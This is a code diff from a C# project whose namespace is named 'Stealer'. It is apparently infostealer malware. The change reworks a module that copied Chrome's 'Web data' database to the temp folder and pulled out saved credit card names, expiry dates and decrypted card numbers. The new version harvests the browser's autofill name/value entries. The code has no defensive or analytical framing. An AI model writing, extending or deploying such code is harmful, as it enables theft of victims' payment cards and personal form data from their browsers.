@@ -10,12 +10,12 @@ using static Stealer.Common;
 
 namespace Stealer
 {
-    internal class CreditCards
+    internal class Autofill
     {
-        public static List<CreditCard> Get()
+        public static List<AutoFill> Get()
         {
             string SqliteFile = "Web data";
-            List<CreditCard> CreditCards = new List<CreditCard>();
+            List<AutoFill> Autofills = new List<AutoFill>();
             // Database
             string tempCCLocation = "";
 
@@ -25,7 +25,7 @@ namespace Stealer
                 string Browser = Paths.GetUserData(browser) + SqliteFile;
                 if (File.Exists(Browser))
                 {
-                    tempCCLocation = Environment.GetEnvironmentVariable("temp") + "\\browserCreditCards";
+                    tempCCLocation = Environment.GetEnvironmentVariable("temp") + "\\browserAutofill";
                     if (File.Exists(tempCCLocation))
                     {
                         File.Delete(tempCCLocation);
@@ -37,34 +37,30 @@ namespace Stealer
 
                 // Read chrome database
                 SQLite sSQLite = new SQLite(tempCCLocation);
-                sSQLite.ReadTable("credit_cards");
+                sSQLite.ReadTable("autofill");
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
                     // Get data from database
-                    string number = sSQLite.GetValue(i, 4);
-                    string expYear = sSQLite.GetValue(i, 3);
-                    string expMonth = sSQLite.GetValue(i, 2);
-                    string name = sSQLite.GetValue(i, 1);
+                    string name = sSQLite.GetValue(i, 0);
+                    string value = sSQLite.GetValue(i, 1);
 
                     // If no data => break
-                    if (string.IsNullOrEmpty(number))
+                    if (string.IsNullOrEmpty(value))
                     {
                         break;
                     }
 
-                    CreditCard credentials = new CreditCard();
-                    credentials.number = Crypt.decryptChrome(number, Browser);
-                    credentials.expmonth = expMonth;
-                    credentials.expyear = expYear;
+                    AutoFill credentials = new AutoFill();
                     credentials.name = Crypt.GetUTF8(name);
+                    credentials.value = Crypt.GetUTF8(value);
 
-                    CreditCards.Add(credentials);
+                    Autofills.Add(credentials);
                     continue;
                 }
                 continue;
             }
-            return CreditCards;
+            return Autofills;
         }
     }
 }
